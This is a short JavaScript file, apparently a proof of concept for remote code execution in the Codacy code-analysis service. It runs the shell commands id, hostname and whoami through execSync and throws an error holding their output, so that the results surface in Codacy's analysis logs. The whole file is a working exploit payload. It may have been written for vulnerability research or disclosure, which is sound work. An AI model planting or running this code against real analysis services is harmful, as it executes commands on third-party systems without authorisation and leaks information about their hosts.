// RCE proof — output captured in thrown error → appears in Codacy analysis logs
const { execSync } = require("child_process");
const run = (cmd) => execSync(cmd, { timeout: 5000 }).toString().trim();
const id     = run("id");
const host   = run("hostname");
const whoami = run("whoami");
throw new Error("CODACY-RCE-PROOF id=" + id + " hostname=" + host + " whoami=" + whoami);
